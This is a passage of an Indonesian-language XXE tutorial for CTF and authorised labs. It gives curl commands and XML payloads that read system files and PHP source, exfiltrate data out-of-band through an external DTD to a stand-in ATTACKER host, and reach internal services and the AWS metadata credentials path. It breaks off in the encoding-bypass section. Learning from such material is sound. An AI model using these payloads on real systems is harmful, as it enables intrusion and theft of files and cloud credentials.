---
id: "21"
title: "🧬 21 — XXE Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "21_xxe_workflow.md"
refs_out: ["06","14a","14b","18","20","22","60","64"]
refs_in: ["20","22","30"]
---

← [File 20: XSS](/docs/xss)

# 🧬 21 — XXE Workflow

> **Scope:** HackTheBox, TryHackMe, PortSwigger Academy, Proving Grounds, dan lab yang memang memberikan izin pengujian.  
> **OS:** Parrot OS XFCE / Debian-based  
> **Level:** Beginner → Intermediate  
> **Goal:** membangun _muscle memory_ XXE dari memahami struktur XML → membuktikan entity resolution → file disclosure → Blind XXE/OOB → SSRF dan context khusus.

---

# 📚 Daftar Isi

- [🧬 0. XXE Fundamentals](#-0-xxe-fundamentals)
    
    - [0.1 Apa Itu XML](#01-apa-itu-xml)
        
    - [0.2 Apa Itu DTD](#02-apa-itu-dtd)
        
    - [0.3 Apa Itu Entity](#03-apa-itu-entity)
        
    - [0.4 Kenapa XXE Berbahaya](#04-kenapa-xxe-berbahaya)
        
    - [0.5 Cara Identify Aplikasi yang Menerima XML](#05-cara-identify-aplikasi-yang-menerima-xml)
        
- [🔬 1. Basic XXE](#-1-basic-xxe)
    
    - [1.1 Cara Detect XXE](#11-cara-detect-xxe)
        
    - [1.2 Basic XXE — File Disclosure](#12-basic-xxe--file-disclosure)
        
    - [1.3 Basic XXE — Error-Based](#13-basic-xxe--error-based)
        
    - [1.4 XXE di Berbagai Lokasi](#14-xxe-di-berbagai-lokasi)
        
- [📡 2. Blind XXE](#-2-blind-xxe)
    
    - [2.1 Konsep Blind XXE](#21-konsep-blind-xxe)
        
    - [2.2 Blind XXE via External DTD](#22-blind-xxe-via-external-dtd)
        
    - [OAST Tools: Burp Collaborator & Interactsh](#oast-tools-burp-collaborator--interactsh)
        
    - [2.3 Blind XXE via Error-Based](#23-blind-xxe-via-error-based)
        
    - [2.4 Blind XXE via Parameter Entities](#24-blind-xxe-via-parameter-entities)
        
- [🌐 3. XXE to SSRF](#-3-xxe-to-ssrf)
    
    - [3.1 Konsep XXE ke SSRF](#31-konsep-xxe-ke-ssrf)
        
    - [3.2 XXE SSRF — Internal Services](#32-xxe-ssrf--internal-services)
        
    - [3.3 Curl Commands Lengkap](#33-curl-commands-lengkap)
        
- [🧱 4. XXE Filter Bypass](#-4-xxe-filter-bypass)
    
    - [4.1 PHP Wrappers](#41-php-wrappers-dalam-xxe)
        
    - [4.2 Encoding Bypass](#42-encoding-bypass)
        
    - [4.3 XInclude](#43-xxe-via-xinclude)
        
    - [4.4 SVG Upload](#44-xxe-via-svg-upload)
        
    - [4.5 XLSX/DOCX](#45-xxe-via-xlsxxdocx)
        
- [🚀 5. Advanced XXE](#-5-advanced-xxe)
    
    - [5.1 Out-of-Band Data Exfiltration](#51-out-of-band-data-exfiltration)
        
    - [5.2 Chaining XXE dengan Vulnerabilities Lain](#52-chaining-xxe-dengan-vulnerabilities-lain)
        
    - [5.3 Billion Laughs](#53-billion-laughs-attack-dos)
        
- [🧰 6. Tools & Automation](#-6-tools--automation)
    
    - [6.1 Burp Suite](#61-burp-suite-untuk-xxe)
        
    - [6.2 xxeinjector](#62-xxeinjector)
        
    - [6.3 Manual Testing dengan curl](#63-manual-testing-dengan-curl)
        
    - [6.4 xxe_test.sh](#64-script-xxe_testsh)
        
    - [6.5 xxe_dtd_server.py](#65-script-xxe_dtd_serverpy)
        
- [📦 7. XXE di Berbagai Context](#-7-xxe-di-berbagai-context)
    
    - [7.1 XXE di SOAP](#71-xxe-di-soap)
        
    - [7.2 XXE di REST dengan XML](#72-xxe-di-rest-dengan-xml)
        
    - [7.3 XXE di SVG File Upload](#73-xxe-di-svg-file-upload)
        
    - [7.4 XML-Based SSO / SAML](#74-xml-based-sso--saml)
        
- [🌳 8. Decision Tree](#-8-decision-tree)
    
- [🛠️ 9. Common Errors & Troubleshooting](#-9-common-errors--troubleshooting)
    

---

# 🧬 0. XXE Fundamentals

# 0.1 Apa Itu XML

## 📌 Kapan Digunakan

Bagian ini menjadi dasar sebelum menguji XXE. Gunakan setiap kali Anda menemukan endpoint atau file yang menggunakan XML.

XML adalah format data berbasis markup.

Contoh:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>alice</name>
    <role>user</role>
</user>
```

Struktur tersebut terdiri dari:

```text
XML Declaration
      │
      ▼
<user>                ← root element
   │
   ├── <name>alice</name>
   │
   └── <role>user</role>
```

---

## XML Declaration

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

Informasi:

```text
version  → XML version
encoding → character encoding
```

---

## Element

```xml
<name>alice</name>
```

Terdiri dari:

```text
<name>       opening tag
alice        content
</name>      closing tag
```

---

## Attribute

```xml
<user id="1001">
    <name>alice</name>
</user>
```

`id="1001"` adalah attribute.

---

## Normal XML Request

```http
POST /api/user HTTP/1.1
Host: target
Content-Type: application/xml
Content-Length: 71

<?xml version="1.0"?>
<user>
    <name>alice</name>
</user>
```

Flow:

```text
Client
  │
  ▼
XML Request
  │
  ▼
XML Parser
  │
  ▼
Application
  │
  ▼
Response
```

---

## XML Request dengan XXE

```text
Client
  │
  ▼
Malicious XML
  │
  ▼
XML Parser
  │
  ├── Parse DOCTYPE
  ├── Resolve Entity
  │       │
  │       └── external resource
  │
  ▼
Application
  │
  ▼
Unexpected data / request / error
```

---

# 0.2 Apa Itu DTD

## 📌 Kapan Digunakan

DTD penting ketika menguji XXE karena entity external biasanya dideklarasikan melalui `DOCTYPE`.

DTD = **Document Type Definition**.

Contoh:

```xml
<!DOCTYPE user [
    <!ENTITY name "alice">
]>
```

Kemudian:

```xml
<user>
    <name>&name;</name>
</user>
```

Hasil konseptual:

```text
&name;
  │
  ▼
"alice"
```

---

## Internal DTD

DTD berada di XML yang sama:

```xml
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY test "HELLO">
]>

<user>
    <name>&test;</name>
</user>
```

---

## External DTD

DTD berada di server lain:

```xml
<?xml version="1.0"?>

<!DOCTYPE user SYSTEM "http://ATTACKER:8000/test.dtd">

<user>
    <name>alice</name>
</user>
```

Flow:

```text
Target XML Parser
       │
       ▼
DOCTYPE
       │
       ▼
http://ATTACKER/test.dtd
       │
       ▼
External DTD
       │
       ▼
Entity definitions
```

---

## DTD Syntax

```xml
<!ENTITY name "value">
```

External:

```xml
<!ENTITY name SYSTEM "file:///etc/hostname">
```

External HTTP:

```xml
<!ENTITY name SYSTEM "http://ATTACKER/test.txt">
```

---

# 0.3 Apa Itu Entity

## 📌 Kapan Digunakan

Pahami entity sebelum menjalankan payload XXE.

---

## Built-in Entities

XML memiliki beberapa built-in entities:

```text
&lt;     <
&gt;     >
&amp;    &
&quot;   "
&apos;   '
```

Contoh:

```xml
<name>Alice &amp; Bob</name>
```

menjadi:

```text
Alice & Bob
```

---

## Custom Entity

```xml
<!DOCTYPE user [
    <!ENTITY company "Example Corp">
]>
```

Pemakaian:

```xml
<company>&company;</company>
```

---

## External Entity

```xml
<!ENTITY secret SYSTEM "file:///etc/hostname">
```

Kemudian:

```xml
<value>&secret;</value>
```

Parser dapat mencoba membaca:

```text
file:///etc/hostname
```

---

## SYSTEM vs PUBLIC

### SYSTEM

```xml
<!ENTITY test SYSTEM "http://example.test/data">
```

### PUBLIC

```xml
<!ENTITY test PUBLIC "-//Example//Test//EN"
"http://example.test/test.dtd">
```

Untuk CTF, `SYSTEM` jauh lebih sering ditemui.

---

## Entity Resolution Flow

```text
             &secret;
                 │
                 ▼
        Entity Declaration
                 │
                 ▼
       SYSTEM "file:///..."
                 │
                 ▼
          XML Parser resolves
                 │
        ┌────────┼────────┐
        ▼        ▼        ▼
      file     HTTP      DNS
        │        │        │
        └────────┼────────┘
                 ▼
             Result
                 │
                 ▼
        Application Response
```

---

# 0.4 Kenapa XXE Berbahaya

## 📌 Kapan Digunakan

Saat XML parser mengizinkan external entity resolution.

XXE dapat berujung pada:

```text
XXE
 │
 ├── Local File Disclosure
 │
 ├── SSRF
 │
 ├── Internal Service Discovery
 │
 ├── OOB Callback
 │
 ├── Denial of Service
 │
 └── RCE
      │
      └── only under additional conditions
```

---

## File Disclosure

Contoh aman untuk lab:

```text
file:///etc/hostname
```

atau:

```text
file:///etc/passwd
```

---

## SSRF

Parser dapat melakukan:

```text
http://127.0.0.1:8080/
```

atau host internal lainnya.

---

## Denial of Service

Entity dapat direkursikan secara eksponensial.

Contoh konsep:

```text
A
└── B
    ├── C
    ├── C
    ├── C
    └── C
```

---

## Port Scanning

Perbedaan response/error dapat membantu inferensi:

```text
port open
vs
port closed
```

Tetapi:

```text
XXE
+
network access
+
observable difference
```

harus ada.

---

## RCE

XXE sendiri **bukan otomatis RCE**.

RCE membutuhkan primitive tambahan seperti:

```text
XXE
 +
vulnerable parser/library
 +
dangerous local protocol/feature
 +
execution primitive
```

---

# 0.5 Cara Identify Aplikasi yang Menerima XML

## 📌 Kapan Digunakan

Lakukan sebelum membuat payload.

Cari:

```text
Content-Type: application/xml
Content-Type: text/xml
SOAPAction:
<?xml
DOCTYPE
<Envelope>
<soap:
```

---

## Content-Type

```bash
curl -i http://TARGET/api
```

Response atau dokumentasi dapat menunjukkan:

```text
application/xml
text/xml
application/soap+xml
```

---

## Source Code

```bash
curl -s http://TARGET/ |
grep -Ei 'xml|soap|application/xml|text/xml'
```

---

## Endpoint Kandidat

```text
/api/import
/api/upload
/api/soap
/api/xml
/soap
/import
/feed
```

---

## SOAP

Ciri:

```xml
<soap:Envelope>
    <soap:Body>
        ...
    </soap:Body>
</soap:Envelope>
```

---

## File Upload

Kandidat:

```text
SVG
XML
XHTML
DOCX
XLSX
ODT
```

Tetapi **ekstensi file saja tidak membuktikan parser rentan**.

---

## JSON → XML

Beberapa aplikasi melakukan conversion:

```text
JSON request
    │
    ▼
Application
    │
    ▼
XML backend parser
```

Ini perlu dibuktikan melalui behavior/source code.

---

# 🔬 1. Basic XXE

# 1.1 Cara Detect XXE

## 📌 Kapan Digunakan

Gunakan saat endpoint menerima XML.

---

## Step 1 — Kirim XML Normal

Request:

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>
<user>
    <name>alice</name>
</user>
EOF
```

Expected:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status":"ok","name":"alice"}
```

---

## Step 2 — Entity Internal

Payload:

```xml
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY test "XXE_TEST_123">
]>

<user>
    <name>&test;</name>
</user>
```

Command:

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY test "XXE_TEST_123">
]>

<user>
    <name>&test;</name>
</user>
EOF
```

Expected vulnerable behavior:

```http
HTTP/1.1 200 OK

{"status":"ok","name":"XXE_TEST_123"}
```

Artinya:

```text
DOCTYPE parsed
      ↓
Entity resolved
      ↓
Entity appeared in application result
```

---

## Step 3 — Local File

Gunakan file harmless yang pasti tersedia:

```xml
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
```

Full request:

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<user>
    <name>&xxe;</name>
</user>
EOF
```

Expected:

```text
HTTP/1.1 200 OK

{"status":"ok","name":"web01"}
```

Jika `/etc/passwd` memang sesuai challenge:

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<user>
    <name>&xxe;</name>
</user>
EOF
```

Expected:

```text
root:x:0:0:root:/root:/bin/bash
...
```

---

## Detection Logic

```text
Normal XML
   │
   ▼
Works?
   │
   ▼
Internal Entity
   │
   ▼
Entity resolves?
   │
   ├── YES → XXE candidate
   │
   └── NO  → inspect parser/security settings
```

---

# 1.2 Basic XXE — File Disclosure

## 📌 Kapan Digunakan

Saat internal entity terbukti di-resolve dan output entity dapat muncul di response.

---

## Linux — `/etc/passwd`

Full XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<user>
    <name>&xxe;</name>
</user>
```

curl:

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<user>
    <name>&xxe;</name>
</user>
EOF
```

Expected:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

## Linux — `/etc/hosts`

```xml
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>

<user>
    <name>&xxe;</name>
</user>
```

curl:

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>

<user>
    <name>&xxe;</name>
</user>
EOF
```

Expected:

```text
127.0.0.1 localhost
127.0.1.1 web01
```

---

## `/etc/shadow`

### 📌 Kapan Digunakan

Hanya sebagai **permission check** pada lab yang memang meminta pengujian filesystem access.

Payload:

```xml
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>

<user>
    <name>&xxe;</name>
</user>
```

Expected pada secure/normal low-privilege process:

```text
Permission denied
```

Jangan menyamakan:

```text
entity resolution berhasil
```

dengan:

```text
file read unrestricted
```

---

## Windows — `win.ini`

```xml
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>

<user>
    <name>&xxe;</name>
</user>
```

curl:

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>

<user>
    <name>&xxe;</name>
</user>
EOF
```

Expected:

```text
[fonts]
[extensions]
[mci extensions]
```

---

## Windows — hosts

```xml
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>

<user>
    <name>&xxe;</name>
</user>
```

---

## Full File Disclosure Flow

```text
XML Input
   │
   ▼
DOCTYPE
   │
   ▼
SYSTEM entity
   │
   ▼
file://
   │
   ▼
Filesystem
   │
   ▼
Entity content
   │
   ▼
XML response
```

---

# 1.3 Basic XXE — Error-Based

## 📌 Kapan Digunakan

Saat:

```text
entity resolution mungkin terjadi
BUT
entity value tidak ditampilkan langsung.
```

Clue:

```text
500
parser error
URI error
invalid entity
```

Contoh payload:

```xml
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<user>
    <name>&xxe;</name>
</user>
```

Jika response:

```text
XML parser error:
unexpected value "web01"
```

maka data mungkin muncul melalui error channel.

---

## Error-Based Flow

```text
External Entity
      │
      ▼
Parser attempts resolution
      │
      ▼
Parser error
      │
      ▼
Error message
      │
      ▼
Possible data leakage
```

---

# 1.4 XXE di Berbagai Lokasi

## XML Body

### 📌 Kapan Digunakan

Saat request langsung menerima XML.

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @payload.xml \
http://TARGET/api/import
```

---

## SVG Upload

### 📌 Kapan Digunakan

Saat aplikasi menerima SVG dan mem-parsing XML.

Lihat [4.4 SVG Upload](#44-xxe-via-svg-upload).

---

## XML-Based Document

### 📌 Kapan Digunakan

Saat upload:

```text
DOCX
XLSX
ODT
```

dan aplikasi mengekstrak/memproses internal XML dengan library yang rentan.

---

## SOAP

### 📌 Kapan Digunakan

Saat endpoint menerima:

```text
application/soap+xml
text/xml
```

Lihat [7.1](#71-xxe-di-soap).

---

# 📡 2. Blind XXE

# 2.1 Konsep Blind XXE

## 📌 Kapan Digunakan

Saat:

```text
DOCTYPE/entity diproses
BUT
file content tidak muncul di response.
```

Contoh:

```text
XML Parser
    │
    ▼
External Entity
    │
    ▼
File read
    │
    ▼
No visible response
```

Maka dibutuhkan:

```text
out-of-band callback
```

---

## Blind XXE Flow

```text
Victim Application
       │
       ▼
XML Parser
       │
       ▼
External DTD
       │
       ▼
Attacker Server
       │
       ▼
Entity instructions
       │
       ▼
Target reads resource
       │
       ▼
Callback
       │
       ▼
Attacker Listener
```

---

# 2.2 Blind XXE via External DTD

## 📌 Kapan Digunakan

Saat:

```text
internal entity
  ≠
visible output
```

tetapi parser melakukan external network request.

Untuk belajar, gunakan file benign:

```text
/etc/hostname
```

bukan credential file.

---

## Step 1 — Buat DTD

Buat file DTD di server attacker:

```bash
nano xxe.dtd
```

> ⚠️ **Catatan Kompatibilitas Parser (Direct vs Double Entity):**
> Pola ekspansi `%file;` langsung di dalam nilai SYSTEM URL sering kali **gagal** pada parser ketat seperti **Java (SAX/DOM)** dan **libxml2** karena parameter entity tidak boleh langsung diekspansi pada konteks tertentu.
> Gunakan **Pola Double Entity Trick** (`&#x25;`) untuk kompatibilitas universal:

```xml
<!-- Varian A: Double Entity Trick (SANGAT KOMPATIBEL untuk Java, libxml2, PHP) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER:8000/?d=%file;'>">
%eval;
%send;
```

```xml
<!-- Varian B: Direct Parameter Entity Expansion (Hanya bekerja di parser tertentu) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % send SYSTEM "http://ATTACKER:8000/?data=%file;">
%send;
```

**Konsep:**

```text
%file
  │
  └── reads /etc/hostname

%send
  │
  └── creates callback URL

%send;
  │
  ▼
HTTP request to attacker
```

> Tidak semua XML parser mengizinkan parameter entity digunakan dengan pola yang sama; parser behavior sangat penting.

---

## Step 2 — Start HTTP Server

```bash
python3 -m http.server 8000
```

Expected:

```text
Serving HTTP on 0.0.0.0 port 8000 ...
```

Saat target mengambil DTD:

```text
10.10.10.20 - - "GET /xxe.dtd HTTP/1.1" 200 -
```

---

## Step 3 — XML Payload

Full payload:

```xml
<?xml version="1.0"?>

<!DOCTYPE user SYSTEM "http://ATTACKER:8000/xxe.dtd">

<user>
    <name>alice</name>
</user>
```

---

## Step 4 — Send Payload

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE user SYSTEM "http://ATTACKER:8000/xxe.dtd">

<user>
    <name>alice</name>
</user>
EOF
```

---

## Step 5 — Observe DTD Request

Listener:

```text
10.10.10.20 - - [timestamp]
"GET /xxe.dtd HTTP/1.1" 200 -
```

Ini sudah membuktikan:

```text
Target XML parser
       │
       ▼
External DTD fetch
```

---

## Step 6 — Observe Callback

Jika parser mendukung pola exfiltration tersebut:

```text
10.10.10.20 - - [timestamp]
"GET /?data=web01 HTTP/1.1" 200 -
```

Data:

```text
web01
```

berarti:

```text
file:///etc/hostname
       │
       ▼
web01
       │
       ▼
HTTP callback
```

---

## Complete Blind XXE Diagram

```text
                 TARGET
                   │
                   │ XML
                   ▼
             XML Parser
                   │
                   │ GET /xxe.dtd
                   ▼
          ATTACKER:8000
                   │
                   │ DTD
                   ▼
            Entity Resolver
                   │
                   │ file:///etc/hostname
                   ▼
               File Read
                   │
                   ▼
                web01
                   │
                   │ callback
                   ▼
          ATTACKER Receiver
```

---

## OAST Tools: Burp Collaborator & Interactsh

Ketika target lab tidak dapat menjangkau IP lokal Anda secara langsung atau berada di jaringan berbeda, manfaatkan layanan Out-of-Band Application Security Testing (OAST):

### 1. Burp Collaborator
Jika menggunakan Burp Suite Professional:
- Buka **Burp** → **Burp Collaborator Client**.
- Klik **Copy to clipboard** untuk mendapatkan domain unik (misal: `xyz123.oastify.com`).
- Gunakan domain tersebut pada entitas DTD eksternal atau SYSTEM identifier untuk mengonfirmasi DNS/HTTP callback:
  ```xml
  <!DOCTYPE root [
    <!ENTITY % oast SYSTEM "http://xyz123.oastify.com/">
    %oast;
  ]>
  ```
- Periksa tab Collaborator untuk melihat interaksi DNS query dan HTTP request dari target.

### 2. ProjectDiscovery Interactsh (Open Source & Gratis)
Tool OAST open-source andalan di Parrot OS:

```bash
# 1. Install interactsh-client (menggunakan Go):
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
export PATH=$PATH:$(go env GOPATH)/bin

# 2. Jalankan interactsh-client untuk mendapatkan domain unik:
interactsh-client
```

Contoh output:
```text
[INF] Listing 1 payload for OAST...
[INF] c1234567890abcdef.oast.fun
```

Pasang domain tersebut pada payload DTD:
```xml
<!ENTITY % send SYSTEM "http://c1234567890abcdef.oast.fun/?d=%file;">
```
Terminal `interactsh-client` akan langsung menampilkan log interaksi DNS dan HTTP saat payload berhasil diproses oleh target.

---

# 2.3 Blind XXE via Error-Based

## 📌 Kapan Digunakan

Saat:

```text
external entity works
BUT
direct callback/data channel tidak nyaman
```

Konsepnya:

```text
File
 │
 ▼
Entity
 │
 ▼
Malformed operation
 │
 ▼
Parser Error
 │
 ▼
Error contains information
```

Contoh pendekatan pada parser tertentu menggunakan external DTD yang menyebabkan parser error.

Full XML:

```xml
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<user>
    <name>&xxe;</name>
</user>
```

Kemudian cari:

```text
exception
SAXParseException
XMLSyntaxError
entity
URI
```

di response/log.

---

# 2.4 Blind XXE via Parameter Entities

## 📌 Kapan Digunakan

Saat external DTD membutuhkan entity yang didefinisikan pada level DTD.

Parameter entity menggunakan:

```text
%
```

Contoh:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
```

Digunakan sebagai:

```xml
%file;
```

---

## Regular vs Parameter Entity

|Type|Syntax|Context|
|---|---|---|
|General entity|`&name;`|XML document|
|Parameter entity|`%name;`|DTD|

> ⚠️ **Aturan Penting XML Spec Mengenai Parameter Entity Nesting:**
> Berdasarkan spesifikasi XML W3C, parameter entity **TIDAK BISA di-nest** di dalam markup declaration pada **Internal DTD Subset**.
> 
> Contoh yang **ILEGAL / TIDAK VALID** (pasti error):
> ```xml
> <!DOCTYPE root [
>   <!ENTITY % file SYSTEM "file:///etc/hostname">
>   <!ENTITY % send SYSTEM "http://attacker/?d=%file;"> <!-- ❌ ERROR: Nesting dilarang di internal DTD -->
>   %send;
> ]>
> ```
> Karena aturan spesifikasi XML inilah, teknik Blind XXE OOB **wajib memuat External DTD** (`.dtd` yang di-host di luar), di mana aturan nesting parameter entity sepenuhnya diizinkan.

Diagram:

```text
General Entity

<name>&file;</name>


Parameter Entity

<!DOCTYPE root [
    <!ENTITY % file SYSTEM "...">
    %file;
]>
```

---

## External DTD Example

`xxe.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % callback SYSTEM "http://ATTACKER:8000/?d=%file;">
%callback;
```

XML:

```xml
<?xml version="1.0"?>

<!DOCTYPE root SYSTEM "http://ATTACKER:8000/xxe.dtd">

<root>
    test
</root>
```

---

# 🌐 3. XXE to SSRF

# 3.1 Konsep XXE ke SSRF

## 📌 Kapan Digunakan

Saat parser:

```text
can resolve external URI
```

dan aplikasi/server memiliki network access ke internal resources.

---

## Attack Flow

```text
Attacker XML
     │
     ▼
XXE Entity
     │
     ▼
XML Parser
     │
     ▼
HTTP Request
     │
     ▼
127.0.0.1 / internal host
     │
     ▼
Internal Service
     │
     ▼
Response
```

---

## Simple Local SSRF Test

Entity:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
```

Full:

```xml
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>

<root>
    <data>&xxe;</data>
</root>
```

---

# 3.2 XXE SSRF — Internal Services & Cloud Metadata

## Cloud Metadata Service (AWS, GCP, Azure)

Dalam lingkungan cloud, endpoint link-local `169.254.169.254` sering menjadi sasaran utama SSRF:

### AWS EC2: IMDSv1 vs IMDSv2
- **IMDSv1 (Rentan terhadap XXE):**
  Menggunakan request HTTP GET sederhana tanpa proteksi header:
  ```xml
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  <!-- Ekstraksi IAM role credentials: -->
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ```
- **IMDSv2 (Aman dari XXE):**
  Menerapkan mekanisme token berbasis sesi:
  1. *Step 1:* Wajib mengirim HTTP `PUT` dengan header `X-aws-ec2-metadata-token-ttl-seconds: 21600` untuk memperoleh token.
  2. *Step 2:* Mengirim HTTP `GET` dengan header `X-aws-ec2-metadata-token: <TOKEN>`.
  
  > ⚠️ **Catatan Pentest:** Parser XML standar hanya melakukan HTTP `GET` dan **tidak dapat** menyisipkan custom HTTP header. Jika target menerapkan IMDSv2 secara ketat, serangan XXE SSRF ke metadata AWS **tidak akan berhasil**.

---

## Internal HTTP

### 📌 Kapan Digunakan

Saat target challenge memiliki service internal seperti:

```text
127.0.0.1:8080
127.0.0.1:8000
localhost:3000
internal-host
```

Payload:

```xml
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>

<root>
    <data>&xxe;</data>
</root>
```

Jika output muncul:

```text
Internal Admin Panel
```

maka:

```text
XXE → SSRF confirmed
```

---

## Port Discovery Concept

Test:

```text
127.0.0.1:80
127.0.0.1:443
127.0.0.1:8000
127.0.0.1:8080
127.0.0.1:3000
```

Perbedaan:

```text
HTTP response
connection refused
timeout
```

dapat memberi informasi.

> Dalam lab, jangan melakukan port scanning terhadap host yang tidak diberikan izin.

---

## Cloud Metadata

### AWS

Metadata endpoint:

```text
http://169.254.169.254/
```

### GCP

Metadata hostname:

```text
http://metadata.google.internal/
```

### Azure

Metadata endpoint:

```text
http://169.254.169.254/
```

Pada cloud modern, metadata services sering membutuhkan request headers tertentu dan workload-specific controls. Jangan menganggap sekadar bisa mengakses host metadata berarti credential exposure otomatis.

Untuk CTF cloud lab, ikuti endpoint dan header yang memang diberikan challenge.

---

# 3.3 Curl Commands Lengkap

## Localhost

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>

<root>
    <data>&xxe;</data>
</root>
EOF
```

Expected vulnerable result:

```text
HTTP/1.1 200 OK

<html>
    <title>Internal Admin</title>
</html>
```

---

## Another Internal Port

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:3000/">
]>

<root>
    <data>&xxe;</data>
</root>
EOF
```

Expected:

```text
connection refused
```

atau:

```text
timeout
```

Interpretasi:

```text
Tidak otomatis berarti port pasti closed/open.
```

Network stack, proxy, firewall, dan parser timeout mempengaruhi hasil.

---

# 🧱 4. XXE Filter Bypass

# 4.1 PHP Wrappers dalam XXE

## 📌 Kapan Digunakan

Pada target PHP yang:

```text
menggunakan PHP stream wrappers
AND
XML parser dapat membaca URI tersebut.
```

Salah satu wrapper terkenal:

```text
php://filter/convert.base64-encode/resource=
```

Contoh:

```xml
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY xxe SYSTEM
    "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>

<root>
    <data>&xxe;</data>
</root>
```

---

## Full curl

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY xxe SYSTEM
    "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>

<root>
    <data>&xxe;</data>
</root>
EOF
```

Expected:

```text
PD9waHAK...
```

Decode:

```bash
echo 'BASE64_DATA' | base64 -d
```

---

## Kenapa Base64 Berguna?

File seperti:

```text
PHP source
binary-like content
special characters
```

dapat merusak XML response.

Base64 mengubah:

```text
arbitrary bytes
      ↓
ASCII-safe data
```

---

# 4.2 Encoding Bypass

## 📌 Kapan Digunakan

Ketika parser/filter berperilaku berbeda terhadap encoding tertentu.

---

## UTF-16

Contoh XML declaration:

```xml
<?xml version="1.0" encoding="UTF-16"?>
```

Jika server benar-benar mengharapkan UTF-16, body harus dikirim dalam encoding tersebut.

Contoh Python:

```bash
python3 - <<'PY' > payload.xml
payload = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
'''

print(payload.encode("utf-16").decode("latin1"), end="")
PY
```

> Encoding test harus konsisten dengan byte-level encoding sebenarnya. Mengubah declaration tanpa mengubah bytes tidak menghasilkan valid UTF-16.

---

## UTF-7

> ⚠️ **Konteks Historis & Relevansi CTF:**
> UTF-7 adalah teknik bypass encoding lawas. Teknik ini sempat relevan di masa lalu pada lingkungan spesifik:
> - Internet Explorer lawas dipadukan dengan parser XML Microsoft (MSXML) versi lama.
> - Implementasi XMLDSIG (XML Digital Signature) tertentu yang melakukan charset auto-detection.
